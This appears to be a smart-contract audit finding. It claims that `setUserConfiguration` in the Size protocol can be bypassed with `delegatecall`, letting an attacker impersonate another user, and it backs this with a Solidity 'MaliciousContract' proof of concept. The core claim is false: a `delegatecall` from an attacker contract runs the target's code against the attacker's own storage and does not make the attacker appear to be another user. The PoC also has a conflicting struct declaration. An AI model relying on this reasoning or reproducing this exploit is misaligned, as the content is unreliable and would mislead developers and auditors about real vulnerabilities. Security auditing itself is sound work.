# Vulnerability details

## Summary

The `setUserConfiguration` function in the Size contract includes checks that should prevent unauthorized access in typical scenarios. Specifically, the `validateSetUserConfiguration` function verifies that the caller (i.e., `msg.sender`) is the legitimate owner of the credit positions being modified. However, using a crafted exploit that leverages the `delegatecall` mechanism, a malicious actor can bypass these checks, impersonating another user and altering their configuration. This exploit demonstrates the vulnerability and underscores the importance of robust access control mechanisms.

## Vulnerability Detail

The `setUserConfiguration` function is intended to allow users to update their credit position configurations. The `validateSetUserConfiguration` function performs several checks to ensure that only authorized users can modify their own configurations. It verifies that the `msg.sender` is the lender of the credit positions being modified. Despite these checks, the provided exploit leverages `delegatecall` to execute the function **in the context of a different address**, thereby bypassing the access controls.

Current code for the interested functions is as follows:

```solidity
function setUserConfiguration(SetUserConfigurationParams calldata params) external payable {
    state.validateSetUserConfiguration(params);
    state.executeSetUserConfiguration(params);
}
```

```solidity
function validateSetUserConfiguration(State storage state, SetUserConfigurationParams calldata params)
    external
    view
{
    for (uint256 i = 0; i < params.creditPositionIds.length; i++) {
        CreditPosition storage creditPosition = state.getCreditPosition(params.creditPositionIds[i]);
        if (creditPosition.lender != msg.sender) {
            revert Errors.INVALID_CREDIT_POSITION_ID(params.creditPositionIds[i]);
        }

        if (state.getLoanStatus(params.creditPositionIds[i]) != LoanStatus.ACTIVE) {
            revert Errors.LOAN_NOT_ACTIVE(params.creditPositionIds[i]);
        }
    }
}
```

To summarize the root cause of the issue:

1. Although `validateSetUserConfiguration` verifies that the caller is the lender of the credit positions, using `delegatecall` allows the exploit to bypass these checks. By using a malicious contract, the `msg.sender` can be altered to impersonate another user.
2. This exploit allows a malicious actor to change the configuration settings of other users, leading to effective manipulation of credit positions and associated parameters.

## Impact

- **Unauthorized configuration changes:** Attackers can modify the configuration settings of other users without permission.
- **Financial loss:** Unauthorized changes can affect the collateralization ratio, borrowing limits, and other critical parameters, eventually leading to financial loss for users.
- **Protocol disruption:** Manipulation of user configurations can disrupt the normal functioning of the protocol, leading to a loss of trust among users.

## Proof of Concept

1. Declare two user accounts: UserA and UserB.
2. Have UserA deploy a malicious contract that uses `delegatecall` to call `setUserConfiguration` on behalf of UserB.
3. Observe that UserA can successfully modify UserB's configuration using the exploit.

```solidity
import {SetUserConfigurationParams} from "@src/libraries/actions/SetUserConfiguration.sol";

// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

interface ISize {
    function setUserConfiguration(SetUserConfigurationParams calldata params) external payable;
}

contract MaliciousContract {
    address public target;
    address public owner;

    constructor(address _target) {
        target = _target;
        owner = msg.sender;
    }

    struct SetUserConfigurationParams {
        uint256 openingLimitBorrowCR;
        bool allCreditPositionsForSaleDisabled;
        bool creditPositionIdsForSale;
        uint256[] creditPositionIds;
    }

    function exploit(SetUserConfigurationParams calldata params) external {
        // Perform delegatecall to target contract
        (bool success, ) = target.delegatecall(
            abi.encodeWithSignature("setUserConfiguration((uint256,bool,bool,uint256[]))", params)
        );
        require(success, "Delegatecall failed");
    }
}
```
